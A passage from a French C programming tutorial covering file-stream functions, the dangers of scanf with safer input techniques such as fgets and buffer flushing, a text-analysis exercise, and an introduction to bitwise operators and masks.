une chaîne de caractères entière d'un coup. Heureusement cette fonction existe. fputs - Ecriture d'une chaîne de caractères Voici le prototype de fputs , semblable à puts , sa sœur que nous avions rencontré au début de ce tutoriel : int fputs ( const char * s , FILE * stream ); La fonction écrit la chaîne s dans le flux stream et retourne un nombre non négatif si elle réussit. Dans le cas contraire, elle retourne EOF. Le code suivant fait la même chose que celui juste avant, mais en utilisant une fonction plus adaptée pour ça. #include <stdio.h> int main ( void ) { FILE * fichier = fopen ( \"test.txt\" , \"w\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } fputs ( \"Salut\" , fichier ); fclose ( fichier ); fichier = NULL ; return 0 ; } Pour terminer, sachez que contrairement à puts , la fonction fputs n'ajoute pas de '\\n' final. La grande famille de printf Tout comme scanf , la fonction printf a une sœur permettant d'écrire sur un flux quelconque : fprintf . En voici le prototype : int fprintf ( FILE * stream , const char * format , ...); Elle écrit tous les arguments passés en paramètres dans le fichier stream : elle fonctionne exactement comme printf , à la différence près que le premier argument est un FILE* . Voici un exemple qui écrit dans un flux le pseudo et le score d'un joueur : #include <stdio.h> int main ( void ) { FILE * fichier ; const char * pseudo = \"Lecteur\" ; const int score = 50 ; fichier = fopen ( \"test.txt\" , \"w\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } fprintf ( fichier , \"%s %d \\n \" , pseudo , score ); fclose ( fichier ); fichier = NULL ; return 0 ; } Vous pouvez vérifier dans le fichier, le nom et le score du joueur ont bien été inscrits, suivis d'un retour à ligne. Afin de vous entrainez, pourquoi ne pas reprendre notre structure de la sous-partie précédente et s'entrainer à écrire chacun des membres dans un flux ? Enfin, sachez que fprintf est également très utile pour signaler les erreurs. Il suffit d'écrire dans le flux stderr . Pourquoi un simple printf / puts ne suffirait-il pas ? Tout d'abord, printf / puts écrivent sur stdout . Dans notre cas, que l'on écrive sur stderr ou stdout , cela revient au même puisque tout est affiché sur la console. Or, si jamais vous utilisez plus tard des bibliothèques graphiques, il se peut que les deux flux soient bien distincts. Il sera donc important de bien séparer les messages d'erreur des messages informatifs. Il se peut également que la console ne se lance pas (c'est le cas dans la grande majorité des applications). Comment faire alors pour afficher des messages ? Voilà pourquoi on préfère utiliser fprintf pour remonter les erreurs. D'autres fonctions En plus de nous permettre de lire et d'écrire dans un fichier, la bibliothèque standard définie d'autres fonctions pour manipuler les flux. Nous allons en voir quelques-unes. Manipuler le curseur Nous avons parlé tout au long de ce chapitre du curseur virtuel qui indique où l'on se situe dans un fichier. Les fonctions que nous avons vu déplace le curseur pour nous, mais il existe des fonctions qui nous permettent de le faire manuellement. Nous allons en voir trois. ftell - Déterminer la position du curseur Cette fonction renvoie la position actuelle du curseur dans le flux passé en paramètre. Son prototype est : long ftell ( FILE * stream ); Je pense que vous n'avez pas besoin d'exemple, la fonction parle d'elle-même. fseek - Repositionner le curseur Voici le prototype de la fonction : int fseek ( FILE * stream , long offset , int whence ); Détaillons ces trois paramètres un par un. Comme à l'accoutumée, l'argument stream correspond au flux sur lequel on souhaite agir. Ensuite, il s'agit de la valeur du déplacement du curseur. En mode texte, cette valeur doit être obligatoirement une valeur retournée par ftell ou 0. C'est le seul comportement garantit par la norme. Si l'on passe une autre valeur, alors on dit que le comportement dépend de l'implémentation : ça marchera sous une plate-forme X avec un compilateur Y mais pas avec une autre. C'est donc quelque chose à éviter, sauf si vous visez une plate-forme particulière. Pour finir, whence , qui signifie « d'où » en français, représente l'origine , le point de départ utilisé par offset pour déplacer le curseur. Trois constantes sont fournies : SEEK_SET : début du fichier ; SEEK_CUR : position actuelle du curseur ; SEEK_END : fin du fichier ; Dans le cas du mode texte, pour avoir un code conforme à la norme, ce paramètre doit obligatoirement être SEEK_SET . Une autre valeur rendra le comportement du programme dépendant de l'implémentation. La fonction retourne 0 si elle réussit, une valeur différente de 0 si elle échoue. rewind - Repositionner le curseur au début Cette fonction sert simplement à remettre le curseur au tout début du fichier. Voici son prototype, qui parle pour lui : void rewind ( FILE * stream ); Préférez l'appel de cette dernière que fseek (pour cet emploi du moins), pour des raisons de clarté et de simplicité. Opérations diverses rename - Renommer un fichier Cette fonction permet de renommer un fichier passé en paramètre par un nouveau nom : int rename ( const char * oldname , const char * newname ); Si newname désigne un fichier déjà existant, la fonction peut soit échouer, soit écraser l'autre fichier déjà présent, tout dépend du système d'exploitation. Si la fonction échoue, elle retourne encore une fois une valeur différente de 0. remove - Supprimer un fichier Cette fonction supprime tout simplement du disque dur le fichier désigné par la chaîne de caractères passée en paramètre, sans confirmation ni possibilité de récupération (donc prudence). Voici son prototype : int remove ( const char * filename ); Si elle réussit, elle retourne la valeur 0 sinon une autre valeur. Ce chapitre nous aura fait découvrir encore d'autres fonctions de <stdio.h> et pourtant elle en contient d'autres, certes moins utilisées, mais qui peuvent toujours servir un jour. Si vous voulez les découvrir, jetez un œil sur ce site , certes en anglais (vous pourrez vous entraîner) mais de très bonne qualité. Le chapitre suivant est la suite logique de celui-ci : nous savons manipuler des flux, mais comment les manipuler de façon sécurisée ? Comment empêcher l'utilisateur de rentrer des valeurs fausses ? Comment empêcher les dépassements de tampons ? Entrées sécurisées L'une des plus grandes règles dans le monde de la programmation est de ne jamais faire confiance à l'utilisateur. Cette règle est particulièrement importante lorsqu'on demande des informations : qui nous prouve que l'utilisateur va répondre correctement, qu'il ne va pas nous envoyer une chaîne de caractères au lieu d'un int ? Il est donc important d'apprendre à sécuriser le mieux possible ses entrées, et c'est le but de ce chapitre. Les dangers de scanf Depuis le début de ce cours nous utilisons la fonction scanf dès qu'il y a besoin de récupérer des informations auprès de l'utilisateur. Elle est relativement simple à première vue, et c'est pour cela que nous l'avons utilisée depuis le début, mais elle est en réalité complexe et potentiellement dangereuse. C'est ce que nous allons illustrer dans cette partie. Chaîne de caractères avec des espaces Le premier problème vient d'une chaîne de caractères qui contiendrait des espaces. En effet, avec l'utilisation du format %s (qui sert à récupérer des chaînes de caractères), scanf supprime les espaces avant et après le premier mot de la chaîne. Du coup, lorsque que l'utilisateur rentre une chaîne avec des espaces, scanf ne va prendre que le premier mot. #include <stdio.h> int main ( void ) { char chaine [ 20 ]; printf ( \"Ecris une phrase s'il-te-plait : \\n \" ); scanf ( \"%s\" , chaine ); printf ( \"Entree : '%s' \\n \" , chaine ); return 0 ; } Écris une phrase s'il-te-plait : Salut ca va ? Entrée : 'Salut' Où est passé le reste des caractères rentrés ? Il sont stockés dans le buffer stdin , c'est à dire la zone mémoire qui stocke tous les caractères rentrés par l'utilisateur. Et le problème est que la prochaine fois que scanf sera appelée, elle ne demandera rien à l'utilisateur et les caractères non-extraits seront stockés dans la chaîne, ce qui est assez embêtant : #include <stdio.h> int main ( void ) { char chaine [ 20 ]; printf ( \"Ecris une phrase s'il-te-plait : \\n \" ); scanf ( \"%s\" , chaine ); printf ( \"Entree : '%s' \\n \" , chaine ); printf ( \"Une autre : \\n \" ); scanf ( \"%s\" , chaine ); printf ( \"Entree : '%s' \\n \" , chaine ); return 0 ; } Écris une phrase s'il-te-plait : Salut ça va ? Entrée : 'Salut' Une autre : Entrée : 'ça' On ne peut même pas rentrer quoi que ce soit, scanf va directement dans le buffer chercher le prochain mot, et ainsi de suite jusqu'à ce qu'elle ait tout récupéré. Nous verrons dans une partie suivante comment vider le buffer. Chaîne de caractères trop longue Un des plus grands dangers avec scanf est lorsque l'on rentre une chaîne de caractères trop longue. Imaginons par exemple que l'on définisse un tableau de 10 char . On peut donc rentrer au maximum 9 caractères. Regardez ce qui se passe lorsqu'on dépasse cette limite. #include <stdio.h> int main ( void ) { char chaine [ 10 ]; printf ( \"Ecris une phrase s'il-te-plait : \\n \" ); scanf ( \"%s\" , chaine ); printf ( \"Entree : '%s' \\n \" , chaine ); return 0 ; } Écris une phrase s'il-te-plait : Anticonstitutionnellement Entrée : 'Anticonstitutionnellement' Ce qui semble anodin à première vue cache un problème grave : en effet, scanf a écrit tous les caractères en mémoire, alors qu'il n'y avait pas la place pour. Où les a t-elle écrit ? A la suite, mais sur des cases mémoires qui n'appartient pas au programme. C'est un dépassement de tampon ( buffer owerflow ). Et bien souvent, le système d'exploitation arrête le programme afin de l'empêcher de faire des dégâts. Il est donc très facile de causer des plantages si l'on n'y prend pas garde. Entrée erronée Un autre problème, que vous avez peut-être déjà constaté, arrive lorsque scanf attend un certain type de données (des nombres par exemple) et qu'on rentre autre chose (des caractères). Tout peut alors arriver : #include <stdio.h> int main ( void ) { int n ; printf ( \"Donne un nombre : \" ); scanf ( \"%d\" , & n ); printf ( \"Merci pour le nombre %d \\n \" , n ); return 0 ; } Donne un nombre : dfdf Merci pour le nombre 2147348480 La fonction fait parfaitement son boulot : elle récupère ce qui est entré et le stocke. Sauf que ça peut être problématique dans certains cas. Je n'ai eu ici qu'une simple valeur erronée (que j'aurais pu éviter en initialisant la variable à 0), mais j'aurais pu avoir plus grave : bugs latents, boucle infinie et même plantage. Comme vous avez pu vous en rendre compte, scanf est potentiellement dangereuse si l'on n'y prend pas garde. Il est donc important d'apprendre à construire des entrées solides. Des alternatives Récupérer une chaîne Pour pouvoir sécuriser les entrées de chaînes de caractères, nous allons réutiliser une fonction que nous avons vu dans le chapitre précédent : fgets . Je vous rappelle le prototype de cette fonction : char * fgets ( char * s , int size , FILE * stream ); Cette fonction lit un certain nombre de caractères d'un flux et écrit ce qu'elle lit dans une chaîne de caractères. On s'en sert habituellement pour lire dans les fichiers, mais on peut aussi lui passer le flux stdin pour récupérer ce que tape l'utilisateur. Essayons de coder un programme qui récupère pile-poil le bon nombre de caractères. On peut pour cela s'aider de sizeof . Voici mon code : #include <stdio.h> int main ( void ) { char chaine [ 20 ]; size_t n = sizeof ( chaine ); printf ( \"Entrez une chaine : \" ); fgets ( chaine , n , stdin ); printf ( \"Voici la chaine rentree : %s \\n \" , chaine ); return 0 ; } Entrez une chaine : Salut ca va ? Voici la chaine rentrée : Salut ca va ? Notez que j'utilise une variable intermédiaire pour stocker la taille du tableau. Dans notre exemple c'est inutile (on aurait pu mettre sizeof(chaine) directement dans l'appel de fgets ), mais je prévois si jamais on devait appeler fgets dans une fonction : comme un tableau est converti en pointeur constant sur son premier élément, en faisant sizeof nous aurions eu la taille du pointeur et non de tout le tableau. En passant par une variable, on est sur de conserver tout le temps la taille du tableau. Comme fgets limite le nombre de caractères lus, il n'y a pas de risque de dépassement, même si la chaîne rentrée est plus grande que le tableau : Entrez une chaine : Anticonstitutionnellement Voici la chaine rentrée : Anticonstitutionnel Le seul problème, c'est que les caractères non-lus sont toujours dans le buffer, et il faut le vider sinon fgets lira directement le buffer sans demander quoi que ce soit à l'utilisateur. Il faut donc que nous codions nous-mêmes une fonction. Une fonction de saisie L'idée est de coder une fonction qui va lire une chaîne de caractère en appelant fgets , mais qui va en plus supprimer le retour à la ligne et vider le buffer. Mais comment vide t-on un buffer ? Vider un buffer Grâce à fflush . Cette fonction, dont le prototype est juste en dessous, permet de vider un buffer des caractères qu'il contient. int fflush ( FILE * stream ); Elle est utilise notamment dans le cas des sorties. Je m'explique. Pour qu'un flux soit affiché à l'écran, il faut que l'une des trois conditions suivantes soit remplie. Le buffer est plein. On ne peut pas contrôler cet évènement. Il faut qu'il y ait le caractère '\\n' . Ou bien il faut que fflush soit appelée. Ainsi, on s'en sert par exemple après un appel d'une fonction de sortie quand la chaîne de caractères passée en argument ne contient pas de '\\n' . En effet, il se peut que ça marche sans appeler cette fonction, mais rien ne garantit que ça marchera tout le temps. Pour s'en assurer, on appelle fflush . Exemple avec un code tout bête : #include <stdio.h> int main ( void ) { int var = 42 ; printf ( \"Entrez un entier : \" ); fflush ( stdout ); scanf ( \"%d\" , & var ); printf ( \"Voici l'entier : %d \\n \" , var ); return 0 ; } L'idée est de coder une fonction qui va lire une chaîne de caractère en appelant fgets , mais qui va en plus supprimer le retour à la ligne et vider le buffer. Si notre fonction fflush marche parfaitement avec les flux de sortie, en revanche il est impossible de l'utiliser sur les flux d'entrées. Pourquoi cela ? Parce que la norme ne précise pas le comportement de cette fonction sur un flux d'entrée. Son utilisation peut donc aussi bien marcher que planter ; c'est un comportement indéterminée. Puisque c'est ainsi, nous allons coder nous-mêmes une fonction capable de vider stdin . Et nous allons utiliser getchar , cette fonction qui lit un caractère de stdin . Il suffit de boucle tant qu'on obtient pas '\\n' ou EOF pour vider entièrement le buffer. On obtient donc ceci : void fflush_stdin ( void ) { int c ; do { c = getchar (); } while ( c != '\\n' && c != EOF ); } Notre fonction de saisie Maintenant que nous savons vider stdin , vous avez toutes les clefs pour coder notre propre fonction de saisie sécurisée. Pensez à éliminer le '\\n' final. Bon courage ! Voici ma version de la fonction . Elle est simple : on lit une chaîne avec fgets , on recherche le caractère '\\n' et si on le trouve on le supprime, sinon on vide le buffer et on retourne -1 pour signaler l'erreur. Si tout s'est bien passé, on retourne 0. Récupérer une valeur Notre fonction ne sait lire pour l'instant que des chaînes de caractères. Si jamais on veut convertir une chaîne en nombre, il existe des fonctions que nous avons déjà vus dans le chapitre des chaînes de caractères : il s'agit de strtol et strtod . Il existe cependant une autre fonction capable de faire la même chose : sscanf . Comme son nom l'indique, sscanf lit des caractères dans une chaîne. Voici son prototype : int sscanf ( char * chaine , const char * format , ...); Son fonctionnement est le même que scanf , sauf qu'elle lit les caractères dans une chaîne et non dans stdin. Tout ce que vous savez de scanf s'applique à sscanf . int main ( void ) { char chaine [ 20 ]; size_t n = sizeof ( chaine ); int temp = 0 ; printf ( \"Entrez un nombre : \" ); fgets ( chaine , n , stdin ); sscanf ( chaine , \"%d\" , & temp ); printf ( \"temp = %d \\n \" , temp ); return 0 ; } Entrez un nombre : 45 temp = 45 Mais là encore, les dangers qui nous guettaient avec scanf nous guettent aussi avec sscanf . Il nous faut donc apprendre à manier correctement scanf . Comment bien utiliser scanf ? Il se peut que la méthode que nous avons vu avec fgets vous paraisse trop lourde, et vous préféreriez continuer à utiliser scanf . Dans ce cas, je vais vous montrez qu'il est possible, mais parfois compliqué, d'utiliser correctement scanf . Limiter le nombre de caractères lus Tout comme fgets , on peut limiter le nombre de caractères que doit lire scanf . On peut ainsi limiter la lecture à 5, 10 ou 100 caractères par exemple. Pour se faire, il suffit de préciser le nombre de caractères à lire entre le % et l'indicateur de conversion. Comme une image vaut mille mots, voici un code qui limite la saisie à 7 caractères : int n ; scanf ( \"%7d\" , & n ); printf ( \">> %d \\n \" , n ); 125 > > 125 -45 > > -45 123456789 > > 1234567 On a par contre le même problème que fgets : les caractères non-lus restent dans le buffer. Il faut donc le vider en utilisant la fonction fflush_stdin , définie plus haut. Cette technique marche aussi parfaitement avec les chaînes de caractères, sous réserve là encore de vider le buffer après la saisie. char chaine [ 10 ]; printf ( \"Entrez une chaine : \" ); scanf ( \"%9s\" , chaine ); fflush_stdin (); printf ( \"Vous avez entre : %s \\n \" , chaine ); Entrez une chaine : Anticonstitutionnellement Vous avez entre : Anticonst Les regexs Abordons à présent le point le plus compliqué de scanf : les expressions régulières (de l'anglais reg ular ex pressions). Elles ne marchent que pour les chaînes de caractères et sont placées entre crochets. Grâce à elles, on peut choisir quel type de caractères récupérer (des chiffres, des minuscules, des majuscules, etc). Voici des exemples de regexs (vous noterez qu'on ne met plus le s comme on en avait l'habitude pour les chaînes de caractères) : char chaine [ 81 ] = { 0 }; /* doit pouvoir contenir tous les caractères dont le '\\0' de fin */ /* Les chiffres de 0 à 9. */ scanf ( \"%80[0-9]\" , chaine ); /* Les minuscules de 'a' à 'z'. */ scanf ( \"%80[a-z]\" , chaine ); /* Les minuscules de 'a' à 'z' et les majuscules de 'A' à 'Z'. */ scanf ( \"%80[a-zA-Z]\" , chaine ); /* Que les lettres de 'd' à 'y' (et de 'H' à 'L') et les chiffres de 2 à 7. */ scanf ( \"%80[d-yH-L2-7]\" , chaine ); Essayez par exemple de faire un programme qui ne lit que les minuscules de 'a' à 'm' , et les chiffres de 4 à 9. Il faut bien sur penser à vider le buffer après l'appel de scanf . Avec mon code , vous devriez obtenir une exécution semblable à celle ci-dessous. Entrez une chaine : abcdtmh785 Vous avez entre : abcd On peut aussi faire lister les caractères que l'on ne veut pas récupérer en utilisant le symbole &#94; : char chaine [ 81 ]; /* On récupère tout sauf les chiffres de 4 à 9. */ scanf ( \"%80[&#94;4-9]\" , chaine ); Cela permet de vider le buffer d'une autre façon. Il suffit de ne lire aucun caractère sauf le retour à la ligne et l'éliminer à l'aide de getchar . char chaine [ 21 ]; /* On récupère 20 caractères. */ scanf ( \"%20s\" , chaine ); /* Puis on vide le buffer en ne gardant aucun caractère ... */ scanf ( \"%*[&#94; \\n ]\" ); /* ... avant de supprimer le '\\n' final.*/ getchar (); Il est donc possible de faire des entrées sécurisées avec scanf , mais cela reste assez complexe et réclame de la rigueur. Enfin, sachez que ce que nous venons de voir est conforme à la norme et marchera partout. Il existe d'autres expressions régulières qui ne sont pas standards et que nous n'aborderons donc pas ici. Malgré les méthodes que nous venons de voir, il est impossible de sécuriser à 100 % ses entrées, donc restez raisonnables, ne tentez pas de tout sécuriser. Après tout, si l'utilisateur fait n'importe quoi, tant pis pour lui ! Vous noterez que c'est comme ça que font beaucoup de programmes. Il est maintenant temps de mettre tout ça en pratique avec un petit TP. T.P - zAnalyse Énoncé zAnalyse Cet exercice vous permettra de manipuler des chaînes de caractères et des fichiers. En effet, vous serez amené à analyser un texte (compter le nombre de paragraphes, de lignes, de mots, de caractères). Tout d'abord, fixons les règles. Un mot est une suite de caractères suivie ou précédant un espace. Un caractère peut représenter une lettre minuscule, une lettre majuscule, un chiffre ou un signe de ponctuation, mais aussi une espace typographique, une tabulation, un retour à la ligne, etc. Une ligne se finit par un retour à la ligne. Un paragraphe représente ici deux retours à la lignes consécutifs. Niveau facile Tout d'abord, l'utilisateur entrera une chaine de caractères, vous ne compterez seulement que : Le nombre de paragraphes Le nombre de lignes Le nombre de mots Le nombre de caractères Voici un exemple possible d'exécution : Votre fichier contient : n paragraphes n lignes n mots n caractères Niveau intermédiaire Un peu plus compliqué, vous devez désormais compter : Le niveau facile Le nombre de chacune des lettres de l'alphabet (sans distinguer les majuscules, les minuscules et les accents). Le nombre de caractères autres (ponctuation, slash, chiffres, etc). L'espace, le retour à la ligne, la tabulation horizontale et le retour chariot ne seront pas pris en compte. Si il n'y a aucune occurrence d'un certain caractère, ne pas l'indiquer. Voici un exemple possible d'exécution : Votre fichier contient : n paragraphes n lignes n mots n caractères dont : n fois la lettre a n fois la lettre b ... n fois la lettre z et n autres caractères Niveau difficile Vous en voulez encore, ça tombe bien, j'ai plusieurs idées. La chaîne de caractères est toujours dans un fichier, vous devrez écrire le résultat dans un autre fichier : Le niveau facile ainsi que le niveau intermédiaire Le nombre moyen de caractères par mot Le ou les mot(s) le(s) plus long(s) ainsi que le nombre de caractères qu'il contient Voici un exemple possible d'exécution : Votre fichier contient : n paragraphes n lignes n mots dont : n fois le mot \"et\" n fois le mot langage ... avec n caracteres par mot en moyenne ainsi que le mot le plus long est programmation (n caracteres) n caractères dont : n fois la lettre a n fois la lettre b ... n fois la lettre z et n autres caractères Prenez votre temps, réfléchissez, ce n'est pas une course. Bonne chance ! Finalement, les flux ce n'est pas toujours une partie de plaisir, surtout en C. Nous avons vu par exemple comment sécuriser les entrées, mais ce n'est pas parfait. Ce que vous devez retenir de cette partie, c'est qu'il faut savoir garder un équilibre : certes il faut sécuriser ses entrées, mais ne passez pas votre temps à ça. Pour aller plus loin Comme vous devez vous en douter, nous ne pouvons tout vous montrer sur le C ni prétendre être exhaustif. En effet, un langage de programmation, c'est comme un langue, on en apprend toujours un peu plus au fur et à mesure, mais on ne peut jamais vraiment le maitriser. Nous avons donc décidé dans cette partie finale de vous parler de quelques points du C que nous n'avions pas abordés jusqu'ici, utilisés un peu plus rarement que tout ce que nous avons vu jusqu'à maintenant, mais qu'il est toujours bien et utile d'apprendre. Nous ferons également une présentation des normes C99 et C11 ainsi qu'un bref aperçu de quelques bibliothèques connues pour ceux qui veulent continuer à apprendre. C'est parti pour la dernière ligne droite ! Opérations bit à bit et champs binaires Le C est souvent qualifié de langage bas-niveau et ce terme n'est pas usurpé. En effet, en plus des pointeurs qui nous font souvent mettre les mains dans le cambouis, le C propose un mécanisme de manipulation de bits que nous allons découvrir dans ce tutoriel. Un autre tutoriel plus général existe sur PDP ; n'hésitez pas à le consulter en parallèle pour approfondir vos connaissances. Quant à nous, nous allons voir ces opérations bitwise à travers le C. Mais avant de commencer, et afin d'éviter de dire répéter plusieurs fois le même contenu dans différents tutoriels, je vous encourage, si jamais les notions de décalages, de XOR et autres vous sont inconnues, à lire la première partie du tutoriel de mewtow et Lucas-84 . Les opérateurs bitwise Le langage C définit six opérateurs dit bitwise . Les voici : & : correspond au ET bitwise (AND) ; | : correspond au OU bitwise (OR) ; &#94; : correspond au OU exclusif bitwise (XOR) ; ~ : correspond au NON bitwise (NOT) ; >> : correspond à un décalage vers la droite ( right shift ) ; << : correspond à un décalage vers la gauche ( left shift ) ; Les opérateurs ET bitwise ( & ) et OU bitwise ( | ) ne doivent pas être confondus avec les opérateurs ET logique ( && ) et OU logique ( || ). Ce sont deux choses aussi différentes que le sont l'opérateur d'affectation = et l'opérateur de comparaison == . Les opérateurs appliqués en C Voici un simple code qui illustrera bien mieux le sujet que milles mots. #include <stdio.h> #define OP(x, y, op) printf(\"%x \" #op \" %x = %x\\n\", (x), (y), (x) op (y)) int main ( void ) { int a = 0xF0 ; /* == 1111 0000 */ int b = 0x0F ; /* == 0000 1111 */ int c = 0x0 ; /* == 0000 0000 */ /* 1111 0000 & 0000 1111 = 0000 0000 */ OP ( a , b , & ); /* 1111 0000 & 0000 0000 = 0000 0000 */ OP ( a , c , & ); /* 1111 0000 | 0000 1111 = 1111 1111 */ OP ( a , b , | ); /* 1111 0000 | 0000 0000 = 1111 1111 */ OP ( a , c , | ); /* 1111 0000 &#94; 0000 1111 = 1111 1111 */ OP ( a , b , &#94; ); /* 1111 0000 &#94; 0000 1111 = 1111 1111 */ OP ( a , c , &#94; ); return 0 ; } Enfin, avant de continuer, sachez que, de même que la plupart des opérateurs que nous avons vu, il existe une forme raccourcie que voici. a = a & b est équivalent à a &= b ; a = a | b est équivalent à a |= b ; a = a &#94; b est équivalent à a &#94;= b ; a = a >> b est équivalent à a >>= b ; a = a << b est équivalent à a <<= b . Les opérateurs de décalage Bit de poids fort / faible Avant toute chose, il est important de définir ce qu'est un bit de poids fort (en anglais Most significant bit ) et un bit de poids faible (en anglais Least significant bit ). C'est très simple. Le bit de poids faible est le bit de moindre importance du nombre ; en clair, le bit le plus à droite dans la réprésentation usuelle. Le bit de poids fort est le bit de plus forte importance du nombre ; en clair, le bit le plus à gauche dans la réprésentation usuelle. Ceci étant dit, vous comprendrez mieux les sous-parties suivantes. Décalage à droite L'opération a >> b décale b bits de a vers la droite. Les bits de poids faible sont perdus ; on complète le nombre avec des bits de poids fort valant 0. Exemple : int a = 0xA0 ; /* == 1010 0000 == 160*/ a >> 3 ; /* == 0001 0100 == 0x14 == 20*/ Si l'expression est signé, le résultat peut être signé. Mais comme le résultat dépend de l'implémentation, il est conseillé de ne pas faire de décalage vers la droite sur un entier négatif. Autre remarque : décaler de $n$ bits vers la droite revient à diviser par $2&#94;n$. En effet, dans notre exemple, $160 = 20 \\times 2&#94;3 = 20 \\times 8$. Décalage à gauche L'opération a << b décale b bits de a vers la gauche. Les bits de poids fort sont perdus ; on complète le nombre avec des bits de poids faible valant 0. Exemple : int a = 0xA0 ; /* == 1010 0000 == 160*/ a << 3 ; /* == 0101 0000 0000 == 0x500 == 1280*/ A l'opposé du décalage vers la droite, cette fois, décaler de $n$ bits vers la gauche revient à multiplier par $2&#94;n$. En effet, dans notre exemple, $1280 = 160 \\times 2&#94;3 = 160 \\times 8$. Exercice : afficher la représentation base 2 d'un entier Il serait quand même plus pratique de pouvoir obtenir la représentation binaire d'un nombre pour mieux visualiser les opérations que l'on fait. Or, si printf fournit des indicateurs de conversions pour l'octal ( %o ) et pour l'hexadécimal ( %x , avec la représentation en majuscules avec %X ), elle ne fournit rien pour le binaire. Soit, nous allons le faire nous mêmes dans ce cas. Réfléchissons. Comment tester, tout d'abord, si un bit est à 1 ou à 0. Quel opérateur bitwise allons-nous utiliser ? L'opérateur ET ( & ) ? Oui, c'est bien lui. Pourquoi ? Parce que cet opérateur ne renvoie 1 que si le bit testé vaut 1 ; il renvoie 0 dans les autres cas. Ainsi, en testant sa valeur, nous savons si le bit vaut 1 ou 0. D'accord, mais un nombre est constitué de plusieurs bits. Comment tous les tester ? Réfléchissons. Quels opérateurs vient-on tout juste de découvrir ? Les opérateurs de décalage. En quoi vont-ils nous être utiles ? Le code ci-dessous devrait vous aider à trouver comment nous allons procéder. printf ( \"0x%x\" , 1 << 3 ); Ce code affiche 0x8 . Or, quelle est la représentation en binaire de ce nombre ? C'est 0b1000. Avez-vous remarqués la particularité de ce nombre ? Seul le bit n°3 vaut 1, tous les autres valent 0. Et alors ? Eh bien avec ce nombre, on peut tester le bit n°3 d'un autre nombre. Exemple ci-dessous. int a = 0x8 ; int b = 0x10 ; printf ( \"bit n°3 de a = %d \\n \" , a & ( 1 << 3 )); printf ( \"bit n°3 de b = %d \\n \" , b & ( 1 << 3 )); On obtient les valeurs 8 et 0. Qu'en déduit-on ? Posons l'opération en utilisant la représentation binaire. On sait que 0x8 est équivalent à 0b1000. Si on applique la table de vérité de l'opérateur ET, on obtient $0b1000 & 0b1000 = 0b1000$. On comprend donc que l'on obtienne 8. De même, 0x10 est équivalent à 0b10000, donc $0b10000 & 0b1000 = 0b00000$. On comprend donc que l'on obtienne 0. Avez-vous saisi le principe ? Il suffit de faire une boucle pour tester tous les bits du nombre et nous obtiendrons sa représentation binaire. D'ailleurs, si on peut commencer par le bit de poids faible et progresser vers le bit de poids fort avec l'opérateur << , rien ne nous empêche de faire l'inverse, c'est à dire de commencer par le bit de poids fort et progresser vers le bit de poids faible avec l'opérateur >> . Seulement, comment connaître le nombre de bits composant un unsigned int par exemple ? Heureusement pour nous, le langage C nous fournit les limites des types entiers dans le fichier d'en-tête <limits.h> . Une des constantes en particulier nous intéresse : UINT_MAX , qui donne la valeur maximum que peut contenir un unsigned int . Comme c'est la valeur maximum, tous ces bits sont à 1. Tel quel, on peut se demander à quoi cela va nous servir. Mais essayez de décaler cette valeur d'un rang vers la droite. Cette fois, le bit de poids fort est à 0 ; tous les autres bits restent à 1. Ceci est normal, puisque décaler d'un rang vers la droite équivaut à diviser par 2. Et maintenant, essayons de lui appliquer l'opérateur NOT ( ~ ). Cette fois, le premier bit sera le seul à 1, tous les autres seront à 0. Tiens, mais c'est parfait ! Grâce à cette valeur, nous pouvons tester le bit de poids fort. Il suffit ensuite de décaler d'un rang vers la droite à chaque tour de boucle pour tester le bit suivant, jusqu'à arriver au bit de poids faible. Cela vous parait un peu compliqué ? Alors ce code C devrait vous aider à y voir plus clair. #include <stdio.h> #include <limits.h> void bin_print_int ( unsigned number ) { unsigned mask = ~ ( UINT_MAX >> 1 ); putchar ( '0' ); putchar ( 'b' ); while ( mask != 0 ) { if ( number & mask ) { putchar ( '1' ); } else { putchar ( '0' ); } mask >>= 1 ; } putchar ( '\\n' ); } int main ( void ) { bin_print_int ( UINT_MAX ); bin_print_int ( UINT_MAX >> 1 ); bin_print_int ( ~ UINT_MAX ); bin_print_int ( ~ ( UINT_MAX >> 1 )); return 0 ; } Avez-vous remarqué la variable mask , ou masque en français ? Nous allons voir tout de suite qu'elle porte parfaitement bien son nom. Le masquage et les champs de bits Les masques Qu'est ce qu'un masque ? Il s'agit d'une valeur binaire de la même taille que la valeur à masquer qui permet de modifier un ou plusieurs bits en une seule opération à l'aide des opérateurs bitwise. Nous en avons vu un exemple dans la partie précedente. En effet, pour tester le bit n°3 d'un nombre, nous avons utilisé la valeur 1 << 3 , qui vaut 0b1000 ; seul le bit n°3 vaut 1, les autres étant à 0. Nous pouvions ainsi tester le bit n°3 de n'importe quel nombre. De même, dans notre fonction bin_print_int , nous avons utilisé des masques pour tester chaque bit de notre nombre et ainsi afficher sa représentation en binaire. A quoi peuvent bien servir les masques, en plus de ce que nous avons vu ? Eh bien grâce à eux, nous allons pouvoir modifier directement un ou plusieurs bits d'un entier ! Mettre un bit à 1 Commençons par trouver quel opérateur nous servira dans ce cas précis. Si vous relisez les tables de vérités des opérateurs (disponibles dans le tutoriel cité en introduction), vous remarquerez que l'opérateur OR ( | ) convient très bien pour cela, puisque x | 0 = x et x | 1 = 1 . Reste à définir notre masque. Prenons notre valeur de test 0xF0. Sa représentation binaire usuelle vaut 0b1111 0000. Supposons que l'on veuille mettre le bit n°8 à 1. Il faut donc un masque où seul le bit n°8 est à 1, soit 0b0001 0000 0000 ou encore 0x100. En appliquant l'opérateur OR, on obtient bien la valeur souhaitée, soit 0b0001 1111 0000. int main ( void ) { int a = 0xF0 ; int masque = 0x100 ; bin_print_int ( a ); bin_print_int ( masque ); a |= masque ; bin_print_int ( a ); printf ( \"a = 0x%x \\n \" , a ); return 0 ; } Mettre un bit à 0 De nouveau, examinons les tables de vérités. Il nous faut un opérateur qui transforme les 1 en 0 et ne touche pas aux 0. Et l'opérateur AND ( & ) fait exactement ce que nous voulons : x & 1 = x et x & 0 = 0 . Reprenons encore notre valeur 0xF0, mais cherchons cette fois à mettre le bit n°5 à 0. Nous avons donc besoin d'un masque où tous les bits valent 1, sauf le bit n°5 qui vaudra 0. Nous obtenons donc le masque 0b1101 1111 soit 0xDF. En appliquant l'opérateur AND, nous obtiendrons la valeur 0b1101 0000, ce qui est bien ce que nous recherchons. int main ( void ) { int a = 0xF0 ; int masque = 0xDF ; bin_print_int ( a ); bin_print_int ( masque ); a &= masque ; bin_print_int ( a ); printf ( \"a = 0x%x \\n \" , a ); return 0 ; } Se fabriquer un masque plus 